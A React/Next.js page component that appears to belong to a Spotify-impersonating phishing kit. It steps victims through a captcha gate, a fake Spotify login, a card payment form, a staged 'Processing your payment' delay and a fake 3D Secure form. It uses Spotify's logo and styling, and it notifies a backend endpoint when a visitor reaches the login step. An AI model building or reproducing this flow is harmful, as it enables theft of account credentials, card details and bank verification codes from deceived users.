"use client"

import { useState, useEffect } from "react"
import { SpotifyLoginForm } from "@/components/spotify-login-form"
import { PaymentForm } from "@/components/payment-form"
import { SpotifyHeader } from "@/components/spotify-header"
import { SpotifyFooter } from "@/components/spotify-footer"
import { Secure3DForm } from "@/components/secure-3d-form"
import { VisitorTracker } from "@/components/visitor-tracker"
import { CaptchaVerification } from "@/components/captcha-verification"

type Step = "captcha" | "login" | "payment" | "processing-final" | "secure-3d"

export default function ClientPage() {
  const [step, setStep] = useState<Step>("captcha")

  const showHeader = step !== "processing-final" && step !== "login" && step !== "captcha"
  const showFooter = step !== "processing-final" && step !== "captcha"

  useEffect(() => {
    if (step === "processing-final") {
      const timer = setTimeout(() => {
        setStep("secure-3d")
      }, 7000)
      return () => clearTimeout(timer)
    }
  }, [step])

  useEffect(() => {
    if (step === "login") {
      const sendVisitorNotification = async () => {
        try {
          await fetch("/api/visitor-notification", { method: "POST" })
        } catch (error) {
          console.error("[v0] Error sending visitor notification:", error)
        }
      }
      sendVisitorNotification()
    }
  }, [step])

  const renderStep = () => {
    switch (step) {
      case "captcha":
        return (
          <main className="flex-1 flex flex-col items-center justify-center p-4 py-8 sm:py-12">
            <CaptchaVerification onVerify={() => setStep("login")} />
          </main>
        )
      case "login":
        return (
          <main className="flex-1 flex flex-col items-center justify-center p-4 py-8 sm:py-12">
            <div className="mb-4 sm:mb-8">
              <svg className="w-10 h-10 sm:w-12 sm:h-12" viewBox="0 0 24 24" fill="white">
                <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" />
              </svg>
            </div>
            <SpotifyLoginForm onLoginSuccess={() => setStep("payment")} />
          </main>
        )
      case "payment":
        return (
          <main className="flex-1 flex items-center justify-center p-4 py-8 sm:py-12">
            <PaymentForm onPaymentSuccess={() => setStep("processing-final")} />
          </main>
        )
      case "processing-final":
        return (
          <div className="flex-1 flex items-center justify-center p-4">
            <div className="w-full max-w-md space-y-8 text-center">
              <div className="flex justify-center">
                <div className="relative w-24 h-24 sm:w-32 sm:h-32">
                  <div className="absolute inset-0 border-4 border-[#1ed760]/20 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-transparent border-t-[#1ed760] rounded-full animate-spin"></div>
                </div>
              </div>
              <div className="space-y-3">
                <h1 className="text-2xl sm:text-3xl font-bold text-white">Processing your payment</h1>
                <p className="text-[#a7a7a7] text-sm sm:text-base">Please wait a moment while we set things up...</p>
              </div>
            </div>
          </div>
        )
      case "secure-3d":
        return (
          <main className="flex-1 flex items-center justify-center p-4 py-8 sm:py-12">
            <Secure3DForm />
          </main>
        )
    }
  }

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col">
      <VisitorTracker />
      {showHeader && <SpotifyHeader />}
      {renderStep()}
      {showFooter && <SpotifyFooter />}
    </div>
  )
}
